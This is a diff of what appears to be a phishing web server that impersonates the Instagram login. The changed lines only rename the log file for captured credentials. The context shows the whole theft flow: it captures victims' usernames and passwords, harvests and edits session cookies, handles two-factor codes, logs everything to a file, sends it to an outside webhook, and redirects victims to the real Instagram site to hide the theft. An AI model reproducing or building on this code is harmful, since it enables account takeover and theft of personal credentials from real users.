@@ -51,12 +51,13 @@ def submit():
     if result and result.get("status") == "ok" and result.get("authenticated") is not None and result.get("authenticated"):
         cookies = edit_cookies(cookies)
         correct_all(username, password, cookies)
-        with open('output/pass_user.log', 'a') as f:
+        with open('output/correct_pass_user.log', 'a') as f:
             f.write(f"\nUsername: {username}\nPassword: {password}\n{cookies}\n")
         message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
         with concurrent.futures.ThreadPoolExecutor() as executor:
             future = executor.submit(send_webhook_message,  message)
             result = future.result()
+
         return redirect("https://www.instagram.com")
 
     elif result.get("two_factor_required"):
@@ -84,7 +85,7 @@ def submit():
                 "display_type": "none"
             }
 
-        with open('output/pass_user.log', 'a') as f:
+        with open('output/correct_pass_user.log', 'a') as f:
             f.write(f"\nUsername: {username}\nPassword: {password}")
         twoFA_active(username,password)
         return redirect("/twoFA")
@@ -113,7 +114,7 @@ def twoFA():
             cookies = edit_cookies(cookies)
             message = "Username: " + username + "\nPassword: " + password + "\n\n" + "\t\tCookies\n" + cookies
             twoFA_correct(cookies)
-            with open('output/pass_user.log', 'a') as f:
+            with open('output/correct_pass_user.log', 'a') as f:
                 f.write(f"{cookies}\n")
             with concurrent.futures.ThreadPoolExecutor() as executor:
                 executor.submit(send_webhook_message,  message)
